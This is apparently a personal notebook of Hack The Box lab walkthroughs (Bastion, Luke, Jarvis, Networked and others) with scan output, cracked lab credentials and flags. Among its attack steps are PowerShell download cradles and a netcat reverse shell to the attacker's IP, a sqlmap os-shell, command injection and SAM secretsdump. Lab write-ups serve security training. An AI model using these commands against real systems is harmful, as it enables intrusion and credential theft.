against some forms of XSS<br />+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.<br />+ The site uses SSL and Expect-CT header is not present.<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Server may leak inodes via ETags, header found with file /, inode: ee, size: 57781cf9aaa2d, mtime: gzip<br />+ The Content-Encoding header is set to &quot;deflate&quot; this may mean that the server is vulnerable to the BREACH attack.<br />+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST <br />+ OSVDB-3268: /admin/: Directory indexing found.<br />+ OSVDB-3092: /admin/: This might be interesting...<br />+ OSVDB-3233: /icons/README: Apache default file found.<br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/></div><div class='page'><h1 class='title level-7'>smb nmap</h1><br/>nmap --script smb-vuln* -p 139,445 10.10.10.123<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-04 13:56 EDT<br />Nmap scan report for friendzone.red (10.10.10.123)<br />Host is up (0.18s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: false<br />| smb-vuln-regsvc-dos: <br />|   VULNERABLE:<br />|   Service regsvc in Microsoft Windows systems vulnerable to denial of service<br />|     State: VULNERABLE<br />|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br />|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes<br />|       while working on smb-enum-sessions.<br />|_          <br /><br />Nmap done: 1 IP address (1 host up) scanned in 94.07 seconds<br /></div><div class='page'><h1 class='title level-7'>Enum4linux</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/FriendZone$ enum4linux -u admin -p WORKWORKHhallelujah@# friendzone<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Sat Apr  4 14:24:06 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... friendzone<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;admin&#39;<br />Password ......... &#39;WORKWORKHhallelujah@#&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================== <br />|    Enumerating Workgroup/Domain on friendzone    |<br /> ================================================== <br />[+] Got domain/workgroup name: WORKGROUP<br /><br /> =================================== <br />|    Session Check on friendzone    |<br /> =================================== <br />[+] Server friendzone allows sessions using username &#39;admin&#39;, password &#39;WORKWORKHhallelujah@#&#39;<br /><br /> ========================================= <br />|    Getting domain SID for friendzone    |<br /> ========================================= <br />Bad SMB2 signature for message<br />[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........<br />[0000] 16 6E C4 C0 59 7E 96 02   77 A3 69 6B 11 BF 40 F8   .n..Y~.. w.ik..@.<br />Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br />enum4linux complete on Sat Apr  4 14:24:09 2020<br /><br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />a9ed20acecd6c5b6b52f474e15ae9a11<br />root<br />b0e6c60b82cf96e9855ac1656a9e90c7</div><div class='page'><h1 class='title level-4'>10.10.10.134 Bastion</h1><br/>nmap showed that 22, 135, 139, and 445 (5985 and 47001(winrm) on the -p- scan)<br />a null smbmap showed a note.txt that stated something about a system backup.<br />I was able to mount the /Backups drive to the kali box.<br />In here I found a .vhd file<br />I used guest mount to mount the .vhd file as a virtual drive<br />Once in the .vhd file I copied /Windows/System32/Sam, Security, and System to /HTB/Bastion/dbdump<br />cd /Bastion/dbdump/<br />secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL<br />put the hashes in hashcrack... gotem!<br />L4mpje:bureaulampje<br />ssh in... Got it in!<br />user.txt<br /><br />while doing pre-script enumeration I saw that in C:\program files (x86) that mRemoteNG was installed<br />after some research I saw that it stores passwords that are reversible in a config file.<br />moved the .xml file onto the kali machine. opened it with gedit and control fed to “password”<br />l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG&gt;copy confCons.xml C:\Backups<br />aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<br /><br />root@CoolHandKali:/Yeet/Machines/HTB/Bastion/mRemoteNG-Decrypt# python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<br />Password: thXLHM96BeKL0ER2<br /><br />ssh in as administrator... rooted!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><br />ssh L4mpje@10.10.10.134<br />bureaulampje<br /><br />powershell.exe IEX(new-object system.net.webclient).downloadfile(&#39;http://10.10.14.60:8080/winPEAS.exe&#39;, ‘C:\Users\L4mpje\Desktop\winPEAS.exe’)<br /><br />powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile(&#39;<a href="http://10.11.0.186/lse.sh','C:\HFS\sac\lllll.sh')">http://10.10.14.60:8080/winPEAS.exe&#39;,&#39;C:\Users\L4mpje\Desktop\wp&#39;)</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/><br />echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap 10.10.10.134 &amp;&amp; nmap -sC -sV 10.10.10.134 &amp;&amp; nmap -p- 10.10.10.134<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-07 15:33 EDT<br />Nmap scan report for 10.10.10.134<br />Host is up (0.16s latency).<br />Not shown: 996 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />135/tcp open  msrpc<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 18.07 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-07 15:34 EDT<br />Nmap scan report for 10.10.10.134<br />Host is up (0.18s latency).<br />Not shown: 996 closed ports<br />PORT    STATE SERVICE      VERSION<br />22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)<br />|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)<br />|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)<br />135/tcp open  msrpc        Microsoft Windows RPC<br />139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn<br />445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -40m06s, deviation: 1h09m15s, median: -7s<br />| smb-os-discovery: <br />|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br />|   Computer name: Bastion<br />|   NetBIOS computer name: BASTION\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2020-04-07T21:34:38+02:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-07T19:34:40<br />|_  start_date: 2020-04-07T19:27:59<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 40.53 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-07 15:34 EDT<br />Nmap scan report for 10.10.10.134<br />Host is up (0.22s latency).<br />Not shown: 65521 closed ports<br />PORT      STATE    SERVICE<br />22/tcp    open     ssh<br />135/tcp   open     msrpc<br />139/tcp   open     netbios-ssn<br />445/tcp   open     microsoft-ds<br />5985/tcp  open     wsman<br />21373/tcp filtered unknown<br />47001/tcp open     winrm<br />49664/tcp open     unknown<br />49665/tcp open     unknown<br />49666/tcp open     unknown<br />49667/tcp open     unknown<br />49668/tcp open     unknown<br />49669/tcp open     unknown<br />49670/tcp open     unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2112.79 seconds<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />9bfe57d5c3309db3a151772f9d86c6cd<br />root<br />958850b91811676ed6620a9c430e65c8</div><div class='page'><h1 class='title level-4'>10.10.10.137 Luke</h1><br/>root@kali:~/Desktop/Machines/HTB/Luke# nmap -sC -sV -oN Luke.txt 10.10.10.137<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-19 19:26 EDT<br />Nmap scan report for 10.10.10.137<br />Host is up (0.15s latency).<br />Not shown: 995 closed ports<br />PORT     STATE SERVICE VERSION<br />21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to 10.10.14.60<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session upload bandwidth limit<br />|      No session download bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      At session startup, client count was 1<br />|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable<br />|_End of status<br />22/tcp   open  ssh?<br />80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3<br />|_http-title: Luke<br />3000/tcp open  http    Node.js Express framework<br />|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8).<br />8000/tcp open  http    Ajenti http control panel<br />|_http-title: Ajenti<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 182.02 seconds<br /><br /><br />-----------------------------------------------------------------------<br />&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;$dbHost = &#39;localhost&#39;;<br />$dbUsername = &#39;root&#39;;<br />$dbPassword  = &#39;Zk6heYCyv6ZE9Xcg&#39;;<br />$db = &quot;login&quot;;<br /><br />$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&amp;gt; error);<br />&lt;/body&gt;&lt;/html&gt;<br />----------------------------------------------------------------------------<br />PASSWORDS<br /><br />admin   http%3A%2F%2F<br /><br /><br /><br />LOGINS<br /><a href="http://10.10.10.137/login.php">http://10.10.10.137/login.php</a><br /><a href="http://10.10.10.137:8000/">http://10.10.10.137:8000/</a><br /><a href="http://10.10.10.137/management/">http://10.10.10.137/management/</a><br /><br /><br />TOKEN<br />&lt;td class=&quot;netInfoParamValue&quot;&gt;session=120fe9c3eb45fb698894d78f8b54ba825c95491f&lt;/td&gt; ========cookie<br /><br /><br />Pretty sure Json web tokens are the key, but I think I need a username password, which I have not found.<br /><code>curl --user name:password http://www.example.com</code><br /><code>curl -H &quot;Authorization: Bearer &lt;ACCESS_TOKEN&gt;&quot; http://10.10.10.137:3000</code><br />wget -user user -password pass http://10.10.10.137:80/<br />Zk6heYCyv6ZE9Xcg<br />curl -s -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; --data &#39;{&quot;username&quot;:&quot;{username}&quot;,&quot;password&quot;:&quot;{password}&quot;<br />curl -X POST <a href="http://10.10.10.137:3000/Login">http://10.10.10.137:3000/Login</a> -H &#39;Content<br /><br /><br /><br /><br /><br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br /><br />curl -X POST -H &#39;Content-Type: application/json&#39; --data &#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;}&#39; <a href="http://10.10.10.137:3000/login">http://10.10.10.137:3000/login</a><br /><br />curl -H &#39;Accept: application/json&#39; -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzODQ1NDQ3LCJleHAiOjE1NjM5MzE4NDd9.xaZeubJPCtvlYr4p--kU-yXdTUyzx2KH4e1JGNRJ9DE&quot; <a href="http://10.10.10.137:3000/users/">http://10.10.10.137:3000/users/</a><br /><br />[{&quot;ID&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Admin&quot;,&quot;Role&quot;:&quot;Superuser&quot;},                           WX5b7)&gt;/rp$U)FW<br />{&quot;ID&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Derry&quot;,&quot;Role&quot;:&quot;Web Admin&quot;},                            rZ86wwLvx7jUxtch<br />{&quot;ID&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Yuri&quot;,&quot;Role&quot;:&quot;Beta Tester&quot;},                               bet@tester87<br />{&quot;ID&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Dory&quot;,&quot;Role&quot;:&quot;Supporter&quot;}]                               5y:!xa=ybfe)/QD<br /><br />Derry with Derrys password was it!! (I think)<br /><br /><br />ajenti  = root<br /><br />/\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\//\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>10.10.10.143 Jarvis </h1><br/>nmap showed that 22, 80, and 64999 were open<br />nothing special about 22<br />64999 just said to play nice<br />In the source code of the index.php on 80 there are links to <a href="http://view-source:http://10.10.10.143/room.php?cod=1">room.php?cod=1</a><br />This looks awfully sql injectionyyyy!!!<br />sqlmap -u &quot;http://10.10.10.143/room.php?cod=2&quot; --risk=3 --level=5 --dbs --dump<br />shows us 4 DB&#39;s!<br />sqlmap -u &quot;http://10.10.10.143/room.php?cod=2&quot; --risk=3 --level=5 --0s-shell -D hotel<br />os-shell!!<br />shell fix<br />sudo -l shows us that we can run /simpler.py as pepper<br />we see that /simpler.py imports os<br />when giving input it denys you from using charachters like ;<br />we got a bash shell by passing     yeet &quot;$(/bin/bash)&quot;<br />got pepper!<br />lse.sh showed that /bin/systemctl had the setuid bit set<br />systemctl is known to be fuckey so I made a new ssh shell&#39;<br />went on gtfo bins and copy&#39;d their code into a nano in the pepper home direcorty with a callback<br />started a listener<br />systemctl start GoFuckYourself.service<br />got root!!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/HTB/Jarvis# nmap -sC -sV -p- 10.10.10.143<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-22 10:27 EDT<br />Nmap scan report for 10.10.10.143<br />Host is up (0.13s latency).<br />Not shown: 65532 closed ports<br />PORT      STATE SERVICE VERSION<br />22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)<br />|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)<br />|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)<br />80/tcp    open  http    Apache httpd 2.4.25 ((Debian))<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_      httponly flag not set<br />|_http-server-header: Apache/2.4.25 (Debian)<br />|_http-title: Stark Hotel<br />64999/tcp open  http    Apache httpd 2.4.25 ((Debian))<br />|_http-server-header: Apache/2.4.25 (Debian)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 450.83 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-22_10-46-01.log<br /><br />Target: http://10.10.10.143:80<br /><br />[10:46:01] Starting: <br />[10:46:02] 403 -  291B  - /.php<br />[10:46:06] 200 -   23KB - /index.php <br />[10:46:07] 200 -    7KB - /images/    <br />[10:46:07] 403 -  293B  - /icons/      <br />[10:46:09] 200 -    1KB - /nav.php        <br />[10:46:10] 200 -    2KB - /footer.php           <br />[10:46:13] 200 -    3KB - /css/             <br />[10:46:18] 200 -    3KB - /js/               <br />[10:46:24] 200 -   91B  - /flex.php          <br />[10:46:41] 200 -    1KB - /fonts/                  <br />[10:48:21] 200 -   14KB - /phpmyadmin/              <br />[10:49:43] 200 -    0B  - /connection.php                 <br />[10:49:45] 302 -    3KB - /room.php  -&gt;  index.php<br />[11:04:28] 200 -    2KB - /sass/                                          <br />[11:06:22] 403 -  301B  - /server-status/                                    <br />                                                                                           <br />Task Completed<br />root@kali:~/Desktop/Machines/HTB/Jarvis# <br /></div><div class='page'><h1 class='title level-7'>64999</h1><br/><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-22_10-46-01.log<br /><br />Target: http://10.10.10.143:64999<br /><br />[10:46:01] Starting: <br />[10:46:02] 403 -  294B  - /.php<br />[10:46:04] 403 -  296B  - /icons/      <br />[11:06:17] 403 -  304B  - /server-status/                  <br />                                                                <br />Task Completed<br />root@kali:~/Desktop/Machines/HTB/Jarvis# <br /><br /><br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.143<br />+ Target Hostname:    10.10.10.143<br />+ Target Port:        80<br />+ Start Time:         2019-10-22 10:46:00 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.25 (Debian)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;ironwaf&#39; found, with contents: 2.0.3<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Cookie PHPSESSID created without the httponly flag<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-3268: /css/: Directory indexing found.<br />+ OSVDB-3092: /css/: This might be interesting...<br />+ Uncommon header &#39;x-ob_mode&#39; found, with contents: 1<br />+ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.<br />+ OSVDB-3268: /images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /phpmyadmin/: phpMyAdmin directory found<br />+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.<br />+ 7863 requests: 0 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2019-10-22 11:03:38 (GMT-4) (1058 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Jarvis# <br /><br /><br /></div><div class='page'><h1 class='title level-7'>64999</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.143<br />+ Target Hostname:    10.10.10.143<br />+ Target Port:        64999<br />+ Start Time:         2019-10-22 10:46:01 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.25 (Debian)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;ironwaf&#39; found, with contents: 2.0.3<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 7865 requests: 0 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2019-10-22 11:03:15 (GMT-4) (1034 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Jarvis# </div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />2afa36c4f05b37b34259c93551f5c44f<br />root<br />d41d8cd98f00b204e9800998ecf84271</div><div class='page'><h1 class='title level-4'>10.10.10.146 Networked</h1><br/>nmap showed that 22, and 80 were open<br />dirsearch showed a backup.tar direcory which showed that there was an upload.php directory<br />in backup.tar it also showed that the upload needed to be a gif, have the magic byte, and be less that 60000 bytes.<br />user shell!! ...as apache... lame<br /><br />after the usual privesc stuff puttered out I found a file that ran as a cron job in a users dir<br />this line let me make a file a guly (the user)<br />    exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);<br /> I was able to write to file by<br />    cd /var/www/html/uploads/<br />    touch bullshit;touch yee;chmod 777 yee<br />onece yee was created I added<br />    #!/bin/bash<br />    nc 10.10.14.60 3232 -e /bin/bash<br />now that the file has been edited and I started a listener<br />    touch bullshit;bash yee<br />yee has been executed!!!<br />we are now guly!!<br /><br />sudo -l shows that we can run /usr/local/sbin/changename.sh as root!<br />if a config runs letting you change either of these simply answer<br />bullshit /bin/bash -i<br />bullshit<br />bullshit<br />bullshit<br /><br /><br />you are now root!<br /><br /><a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/HTB/Heist# nmap -sC -sV -p- 10.10.10.146<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-21 08:38 EDT<br />Nmap scan report for 10.10.10.146<br />Host is up (0.099s latency).<br />Not shown: 65532 filtered ports<br />PORT    STATE  SERVICE VERSION<br />22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)<br />|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)<br />|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)<br />80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)<br />|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />443/tcp closed https<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 168.19 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-21_08-44-18.log<br /><br />Target: http://10.10.10.146:80<br /><br />[08:44:18] Starting: <br />[08:44:19] 200 -  229B  - /index.php<br />[08:44:19] 403 -  210B  - /cgi-bin/   <br />[08:44:21] 200 -   73KB - /icons/      <br />[08:44:22] 200 -    2B  - /uploads/    <br />[08:44:22] 200 -    1KB - /photos.php     <br />[08:44:24] 200 -  169B  - /upload.php           <br />[08:44:27] 200 -    0B  - /lib.php           <br />[08:44:37] 200 -  885B  - /backup/ </div><div class='page'><h1 class='title level-6'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.146<br />+ Target Hostname:    10.10.10.146<br />+ Target Port:        80<br />+ Start Time:         2019-10-21 08:44:17 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16<br />+ Retrieved x-powered-by header: PHP/5.4.16<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-3268: /backup/: Directory indexing found.<br />+ OSVDB-3092: /backup/: This might be interesting...<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8672 requests: 0 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2019-10-21 09:00:01 (GMT-4) (944 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Heist# <br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user    526cfc2305f17faaacecf212c57d71c5<br /><br />root    0a8ecda83f1d81251099e8ac3d0dcb82</div><div class='page'><h1 class='title level-4'>10.10.10.149 Heist</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (Local User)<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.<br />S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (Local User)<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.<br /><br />jason<br />chase   <br />hazard<br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Standard# nmap -sC -sV -p- 10.10.10.149<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-21 16:16 EDT<br />Nmap scan report for 